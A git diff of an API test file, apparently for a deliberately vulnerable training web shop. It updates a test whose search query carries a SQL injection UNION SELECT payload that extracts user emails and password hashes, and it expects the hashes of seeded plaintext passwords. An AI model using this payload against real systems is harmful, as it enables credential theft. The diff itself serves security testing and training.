@@ -76,38 +76,38 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can create UNION SELECT with Users table and required columns', () => {
-    return frisby.get(`${REST_URL}/products/search?q=')) union select id,email,password,'4','5','6','7','8','9' from users--`)
+    return frisby.get(`${REST_URL}/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
         id: 1,
-        name: 'admin@' + config.get('application.domain'),
-        description: insecurity.hash('admin123')
+        price: 'admin@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('admin123')
       })
       .expect('json', 'data.?', {
         id: 2,
-        name: 'jim@' + config.get('application.domain'),
-        description: insecurity.hash('ncc-1701')
+        price: 'jim@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('ncc-1701')
       })
       .expect('json', 'data.?', {
         id: 3,
-        name: 'bender@' + config.get('application.domain')
+        price: 'bender@' + config.get('application.domain')
         // no check for Bender's password as it might have already been changed by different test
       })
       .expect('json', 'data.?', {
         id: 4,
-        name: 'bjoern.kimminich@gmail.com',
-        description: insecurity.hash('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
+        price: 'bjoern.kimminich@gmail.com',
+        deluxePrice: insecurity.hash('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
       })
       .expect('json', 'data.?', {
         id: 5,
-        name: 'ciso@' + config.get('application.domain'),
-        description: insecurity.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
+        price: 'ciso@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
       })
       .expect('json', 'data.?', {
         id: 6,
-        name: 'support@' + config.get('application.domain'),
-        description: insecurity.hash('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
+        price: 'support@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
       })
   })
 
